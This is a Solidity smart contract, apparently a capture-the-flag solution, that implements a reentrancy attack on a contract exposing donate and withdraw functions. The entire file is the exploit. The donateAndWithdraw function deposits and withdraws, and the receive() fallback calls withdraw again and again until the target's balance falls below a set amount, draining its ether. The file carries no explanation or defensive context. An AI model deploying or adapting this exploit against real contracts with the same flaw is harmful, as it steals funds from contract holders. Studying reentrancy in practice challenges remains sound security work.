
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    IReentrance targetContract;
    uint public targetValue = 360; 

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        targetContract.donate{value:msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue);
        }
    }
}
